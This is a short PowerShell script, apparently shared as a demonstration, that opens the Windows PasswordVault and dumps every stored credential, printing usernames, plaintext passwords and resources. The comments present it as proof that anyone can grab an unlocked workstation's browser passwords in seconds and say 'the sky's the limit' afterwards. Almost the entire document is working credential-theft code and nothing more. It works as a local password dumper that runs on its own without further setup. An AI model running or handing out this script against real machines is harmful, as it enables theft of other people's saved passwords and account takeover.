# Whipped this little guy up to show how in less than 10 seconds anyone can compromise an unlocked windows workstation and get all your browser passwords.
# From there the sky's the limit.

#Open That Vault
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]

#Get Me Some Passwords
(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() |  ForEach-Object { $_.RetrievePassword(); $_ } |  Select Username, Password, Resource
